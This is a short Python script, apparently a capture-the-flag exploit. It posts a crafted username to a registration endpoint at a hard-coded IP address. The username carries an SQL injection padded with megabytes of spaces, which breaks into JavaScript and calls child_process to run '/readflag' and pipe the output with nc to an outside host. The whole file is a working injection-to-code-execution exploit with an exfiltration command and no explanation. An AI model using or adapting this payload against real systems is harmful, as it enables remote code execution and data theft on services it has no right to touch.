from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print 'ok'
r = requests.post('http://13.113.21.59:31337/reg', data=data);
print r.content